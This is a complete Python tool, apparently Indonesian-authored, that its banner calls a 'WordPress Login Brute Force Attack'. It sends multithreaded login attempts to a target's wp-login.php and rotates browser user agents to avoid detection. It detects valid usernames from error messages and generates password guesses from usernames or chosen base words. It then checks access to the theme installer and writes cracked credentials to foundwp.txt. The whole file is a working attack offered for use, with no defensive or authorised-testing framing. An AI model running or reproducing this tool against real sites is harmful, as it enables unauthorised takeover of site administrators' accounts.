import requests
import os
import sys
import time
import random
import signal
import threading
from queue import Queue
# Color definitions
CEN = '\33[0m' # End color
CRE = '\33[91m' # Red
CHE = '\33[92m' # Green
CYL = '\33[93m' # Yellow
CCY = '\33[96m' # Cyan
CWH = '\33[97m' # White
# User-Agent list
USER_AGENTS = [
    # --- Windows (Chrome / Edge / Firefox) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    # --- Windows 11 token (kadang dipakai) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    # --- macOS (Chrome / Safari / Firefox) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2; rv:126.0) Gecko/20100101 Firefox/126.0",
    # --- Linux Desktop (Chrome / Firefox) ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    # --- Android (Chrome Mobile) ---
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Mi 11T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    # --- iOS (Safari / Chrome iOS / Firefox iOS) ---
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/126.0 Mobile/15E148 Safari/605.1.15",
    # --- Tablet Android (Chrome) ---
    "Mozilla/5.0 (Linux; Android 13; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Lenovo TB-J706F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]
def signal_handler(sig, frame):
    print(CRE + "\nOperation terminated by user" + CEN)
    os._exit(0)
def generate_custom_wordlist(base_words):
    variants = []
    suffixes = ["", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "11", "12", "22", "23", "33", "34", "44", "45", "55", "56", "66", "67", "77", "78", "88", "89", "90", "99", "111", "123", "222", "234", "333", "345", "444", "456", "555", "567", "666", "678", "777", "789", "888", "890", "999", "1111", "1234", "1945", "1980", "1981", "1982", "1983", "1984", "1985", "1986", "1987", "1988", "1989", "1990", "1991", "1992", "1993", "1994", "1995", "1996", "1997", "1998", "1999", "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2222", "2345", "3333", "3456", "4444", "4567", "5555", "5678", "6666", "6789", "7777", "7890", "8888", "9999", "11111", "12345", "22222", "23456", "33333", "34567", "44444", "45678", "55555", "56789", "66666", "67890", "77777", "88888", "99999"]
    symbols = ["", "!", "@", "#", "$", "%", "&", "?", "~"]
    for base_word in base_words:
        for symbol in symbols:
            for suffix in suffixes:
                variants.append(f"{base_word}{symbol}{suffix}")
                variants.append(f"{base_word}{suffix}{symbol}")
    return list(set(variants))
def save_result(target_url, username, password):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("foundwp.txt", "a") as f:
        f.write(f"[{timestamp}]\n")
        f.write(f"URL : {target_url}\n")
        f.write(f"Username : {username}\n")
        f.write(f"Password : {password}\n")
        f.write("-" * 50 + "\n")
def read_wordlist(wordlist_path):
    """Read wordlist file and return list of passwords"""
    passwords = []
    try:
        if os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            return passwords, True
        else:
            return [], False
    except Exception as e:
        return [], False
class BruteForceThread:
    def __init__(self, target_url, username, thread_count=10):
        self.target_url = target_url
        self.username = username
        self.thread_count = thread_count
        self.found = False
        self.password_found = None
        self.lock = threading.Lock()
        self.counter = 0
        self.total_passwords = 0
        self.wrong_user = False
       
    def try_login(self, password):
        """Try single login attempt"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS)
        }
       
        data_diction = {"log": self.username, "pwd": password, "wp-submit": "Log In"}
       
        try:
            response = requests.post(self.target_url, data=data_diction, headers=headers, timeout=10, allow_redirects=False)
            content = response.content.decode('utf-8', errors='ignore')
           
            # Check results
            if "The password you entered for the username" in content or "Invalid username or password" in content:
                return False
            elif "username." in content or "Unknown username" in content:
                return "wrong_user"
            elif "Dashboard" in content or "wp-admin" in content or "Redirecting" in content or "logout" in content.lower():
                # Cek apakah halaman wp-admin/theme-install.php bisa diakses
                check_url = self.target_url.replace('wp-login.php', 'wp-admin/theme-install.php')
                check_headers = {'User-Agent': random.choice(USER_AGENTS)}
                check_response = requests.get(check_url, headers=check_headers, timeout=10, allow_redirects=True)
                if check_response.status_code == 200:
                    return True
                else:
                    return False
            elif response.status_code == 302:
                location = response.headers.get('location', '').lower()
                if 'wp-admin' in location or 'dashboard' in location:
                    # Cek apakah halaman wp-admin/theme-install.php bisa diakses
                    check_url = self.target_url.replace('wp-login.php', 'wp-admin/theme-install.php')
                    check_headers = {'User-Agent': random.choice(USER_AGENTS)}
                    check_response = requests.get(check_url, headers=check_headers, timeout=10, allow_redirects=True)
                    if check_response.status_code == 200:
                        return True
                    else:
                        return False
                elif 'wp-login.php' not in location:
                    # Cek apakah halaman wp-admin/theme-install.php bisa diakses
                    check_url = self.target_url.replace('wp-login.php', 'wp-admin/theme-install.php')
                    check_headers = {'User-Agent': random.choice(USER_AGENTS)}
                    check_response = requests.get(check_url, headers=check_headers, timeout=10, allow_redirects=True)
                    if check_response.status_code == 200:
                        return True
                    else:
                        return False
                else:
                    return False
            else:
                return False
               
        except Exception as e:
            return False
   
    def worker(self, password_queue):
        """Worker thread function"""
        while not self.found and not self.wrong_user:
            try:
                password = password_queue.get_nowait()
            except:
                break
           
            # Try the password
            result = self.try_login(password)
           
            # Update counter
            with self.lock:
                self.counter += 1
                current = self.counter
           
            # Update progress display
            with self.lock:
                sys.stdout.write(f"\r{CCY}[{current}/{self.total_passwords}]{CEN} {CWH}Testing: {CYL}{self.username}{CEN}:{CYL}{password[:30]}{CEN}")
                sys.stdout.flush()
           
            if result == "wrong_user":
                with self.lock:
                    self.wrong_user = True
                break
            elif result == True:
                with self.lock:
                    self.found = True
                    self.password_found = password
                break
           
            password_queue.task_done()
   
    def brute_force(self, passwords, phase_name):
        """Brute force with threading - Memastikan semua password dicoba"""
        print(f"\n{CHE}[{phase_name}]{CEN} {CWH}Brute forcing: {CYL}{self.username}{CEN}")
        print(f"{CCY}[i] Total passwords: {len(passwords)}{CEN}")
        print(f"{CCY}[i] Using {self.thread_count} threads{CEN}")
       
        self.total_passwords = len(passwords)
        self.counter = 0
        self.found = False
        self.password_found = None
        self.wrong_user = False
       
        # Create queue and add all passwords
        password_queue = Queue()
        for password in passwords:
            password_queue.put(password)
       
        start_time = time.time()
       
        # Create and start threads
        threads = []
        for i in range(min(self.thread_count, len(passwords))): # Tidak lebih dari jumlah password
            thread = threading.Thread(target=self.worker, args=(password_queue,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
       
        # Wait for all threads to complete or password found
        try:
            # Wait for queue to be empty
            while not password_queue.empty() and not self.found and not self.wrong_user:
                time.sleep(0.1)
           
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=1)
               
        except KeyboardInterrupt:
            self.found = True
            print(f"\n{CRE}[!] Brute force interrupted{CEN}")
       
        elapsed = time.time() - start_time
       
        if self.wrong_user:
            print(f"\n{CRE}[-] Wrong username: {self.username}{CEN}")
            return False
        elif self.found and self.password_found:
            print(f"\n{CHE}[+] SUCCESS! {CEN}{CWH}Password found: {CHE}{self.password_found}{CEN}")
            print(f"{CCY}[i] Time: {elapsed:.2f}s | Attempts: {self.counter}{CEN}")
            save_result(self.target_url, self.username, self.password_found)
            return True
        else:
            print(f"\n{CRE}[-] Phase completed. Tried {self.counter} passwords, no match.{CEN}")
            print(f"{CCY}[i] Time: {elapsed:.2f}s | Total attempts: {self.counter}/{len(passwords)}{CEN}")
           
            # Verifikasi bahwa semua password sudah dicoba
            if self.counter < len(passwords):
                print(f"{CRE}[!] WARNING: Not all passwords were tested! ({self.counter}/{len(passwords)}){CEN}")
            else:
                print(f"{CCY}[✓] All {len(passwords)} passwords were tested{CEN}")
           
            return False
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(CCY + r"""
  _____ _
 | ____|_ ____ _| |
 | _| \ \ / / _` | | WordPress Login Brute Force Attack
 | |___ \ V / (_| | |___ With Dynamic Wordlist From Username.
 |_____| \_/ \__,_|_____| fb.me/fesbuk.th
    """ + CEN)
    # Get target information
    target_url = input(f"\n{CCY}Target URL Login Page {CYL}[Ex: http://site.com/wp-login.php]{CEN}: ")
   
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
   
    if not target_url.endswith(('wp-login.php', 'wp-admin')):
        if not target_url.endswith('/'):
            target_url += '/'
        target_url += 'wp-login.php'
   
    usernames_input = input(f"{CCY}Usernames (separated by |) {CYL}[Ex: admin|user|test]{CEN}: ")
    usernames = [u.strip() for u in usernames_input.split('|') if u.strip()]
   
    if not usernames:
        print(CRE + "[!] No usernames provided!" + CEN)
        sys.exit(1)
   
    # INPUT BARU: Base words untuk custom wordlist
    print(f"\n{CWH}Custom Wordlist Base Words:{CEN}")
    print(f"{CYL}[i] Leave empty to use username as base words{CEN}")
    base_words_input = input(f"{CCY}Base words (separated by |) {CYL}[Ex: admin|company|2024 or leave empty]{CEN}: ").strip()
    
    custom_base_words = []
    if base_words_input:
        custom_base_words = [w.strip() for w in base_words_input.split('|') if w.strip()]
        print(f"{CHE}[✓]{CEN} {CWH}Will use custom base words: {CYL}{', '.join(custom_base_words)}{CEN}")
    else:
        print(f"{CCY}[i]{CEN} {CWH}Will use username as base words{CEN}")
   
    try:
        thread_count = int(input(f"\n{CCY}Thread count {CYL}[Default: 10]{CEN}: ") or "10")
        if thread_count < 1:
            thread_count = 10
    except ValueError:
        thread_count = 10
   
    # Ask for attack order (2 options only)
    print(f"\n{CWH}Which one would you choose first to perform a login attack?:")
    print(f"{CWH}[cw] {CYL}Custom wordlist (cw){CEN} {CWH}(generate passwords from base words) FIRST!{CEN}")
    print(f"{CWH}[w] {CYL}Wordlist.txt (w){CEN} {CWH}(use passwords from wordlist.txt) FIRST!{CEN}")
   
    try:
        attack_option = input(f"\n{CCY}Select option {CYL}[cw/w, Default: cw]{CEN}: ").strip().lower() or "cw"
        if attack_option not in ["cw", "w"]:
            attack_option = "cw"
    except:
        attack_option = "cw"
   
    # Read wordlist if needed
    wordlist_passwords = []
    wordlist_available = False
   
    if attack_option == "w":
        print(f"\n{CCY}[i]{CEN} {CWH}Loading wordlist.txt...{CEN}")
        wordlist_passwords, wordlist_available = read_wordlist("wordlist.txt")
        if wordlist_available and wordlist_passwords:
            print(f"{CHE}[✓]{CEN} {CWH}Loaded {CYL}{len(wordlist_passwords)}{CWH} passwords from wordlist.txt{CEN}")
        else:
            print(f"{CRE}[!]{CEN} {CWH}wordlist.txt not found or empty{CEN}")
            print(f"{CYL}[i] Switching to custom wordlist option{CEN}")
            attack_option = "cw"
   
    print(f"\n{CCY}[i]{CEN} {CWH}Starting attack on {CYL}{len(usernames)}{CWH} username(s){CEN}")
    print(f"{CCY}[i]{CEN} {CWH}Target: {CYL}{target_url}{CEN}")
    print(f"{CCY}[i]{CEN} {CWH}Threads per username: {CYL}{thread_count}{CEN}")
    print(f"{CCY}[i]{CEN} {CWH}Attack option: {attack_option}{CEN}")
   
    start_time = time.time()
    found = False
   
    for username in usernames:
        if found:
            break
       
        print(f"\n{CCY}[i]{CEN} {CWH}Processing username: {CYL}{username}{CEN}")
       
        # Create brute force instance
        brute = BruteForceThread(target_url, username, thread_count)
       
        # Tentukan base words yang akan digunakan
        if custom_base_words:
            # Gunakan custom base words dari input
            base_words_to_use = custom_base_words
        else:
            # Gunakan username sebagai base word
            base_words_to_use = [username]
       
        if attack_option == "cw":
            # Generate and try custom passwords from base words
            custom_passwords = generate_custom_wordlist(base_words_to_use)
            print(f"{CCY}[i]{CEN} Generated {CYL}{len(custom_passwords)}{CEN} password variants from base words: {CYL}{', '.join(base_words_to_use)}{CEN}")
           
            found = brute.brute_force(custom_passwords, "CUSTOM WORDLIST")
           
            # Jika gagal dan username benar, langsung lanjut ke wordlist.txt
            if not found and not brute.wrong_user:
                # Cek apakah wordlist sudah dibaca
                if not wordlist_available:
                    wordlist_passwords, wordlist_available = read_wordlist("wordlist.txt")
               
                if wordlist_available and wordlist_passwords:
                    print(f"\n{CCY}[i]{CEN} {CWH}Continuing to wordlist.txt phase...{CEN}")
                    brute.found = False
                    brute.password_found = None
                    brute.wrong_user = False
                    found = brute.brute_force(wordlist_passwords, "WORDLIST.TXT")
       
        elif attack_option == "w":
            # Try wordlist.txt passwords
            if wordlist_available and wordlist_passwords:
                found = brute.brute_force(wordlist_passwords, "WORDLIST.TXT")
           
            # Jika gagal dan username benar, langsung lanjut ke custom wordlist
            if not found and not brute.wrong_user:
                print(f"\n{CCY}[i]{CEN} {CWH}Continuing to custom wordlist phase...{CEN}")
                custom_passwords = generate_custom_wordlist(base_words_to_use)
                print(f"{CCY}[i]{CEN} Generated {CYL}{len(custom_passwords)}{CEN} password variants from base words: {CYL}{', '.join(base_words_to_use)}{CEN}")
                brute.found = False
                brute.password_found = None
                brute.wrong_user = False
                found = brute.brute_force(custom_passwords, "CUSTOM WORDLIST")
       
        if not found and not brute.wrong_user:
            print(f"\n{CRE}[-] No password found for {username}{CEN}")
        elif brute.wrong_user:
            print(f"\n{CRE}[-] Username {username} doesn't exist, skipping...{CEN}")
   
    elapsed_time = time.time() - start_time
   
    if found:
        print(f"\n{CHE}[✓] Attack completed successfully{CEN}")
    else:
        print(f"\n{CRE}[✗] No valid credentials found{CEN}")
    print(f"{CCY}[x] Total time: {elapsed_time:.2f} seconds{CEN}")
    print(f"{CCY}[x] Attempted {len(usernames)} username(s){CEN}")
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    try:
        main()
    except KeyboardInterrupt:
        print(CRE + "\nOperation terminated by user" + CEN)
        sys.exit(0)
    except Exception as e:
        print(CRE + f"\nError: {str(e)}" + CEN)
        sys.exit(1)
